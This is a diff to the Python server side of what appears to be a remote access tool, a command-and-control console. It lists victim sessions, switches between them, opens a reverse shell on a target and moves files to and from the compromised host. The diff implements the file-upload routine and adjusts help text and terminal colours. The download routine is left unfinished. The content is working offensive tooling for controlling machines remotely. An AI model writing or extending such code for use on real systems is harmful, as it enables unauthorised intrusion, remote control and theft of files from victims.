@@ -50,13 +50,22 @@ def shell(conn):
 
 def upload_file(conn, local_path, remote_path):
     print("\033[96m[INFO] Uploading the specified file...\033[0m")
-    # TODO: everything
+    f = open(local_path, 'rt')
+    content = f.read()
+
+    send_command(conn, 'upload', content, remote_path)
+
+    upload_status = wait_response(conn)
+    if upload_status == 'done':
+        print('\033[92m[INFO] File uploaded successfully!\033[0m')
+    else:
+        print('\033[93m[WARN] There was an error uploading the file. Error:\n', upload_status, '\033[0m\n')
 
 def download_file(conn, remote_path):
     print("\033[96m[INFO] Retrieving the requested file...\033[0m")
     send_command(conn, 'download', remote_path)
 
-    file = wait_response(conn) # TODO: to be finished...
+    f = wait_response(conn) # TODO: to be finished...
     
 def listen_for_connections(server):
     """Continuously listen for new incoming connections"""
@@ -89,13 +98,13 @@ if __name__ == '__main__':
                             sessions: Lists all the active sessions
                             session <number>: Select the specified session
                             shell: Opens a reverse shell on the target
-                            upload <local_file> <destination_path>: Uploads a specified file (full local path)
+                            upload <local_file> <destination_path>: Uploads a specified file (absolute local path)
                             download <remote_file>: Downloads a file from the remote host\n
                         """)
                 case 'sessions': 
                     i = 0
                     for connection in connections: # Parse all the connections stored to list them
-                        print(f"{i} ---- {connection[1]} ----", "\033[92mcurrent" if i == session else " ")
+                        print(f"{i} ---- {connection[1]} ----", "\033[92mcurrent\033[0m" if i == session else " ")
                         i += 1
                 case 'session':
                     session = int(parameters[1])
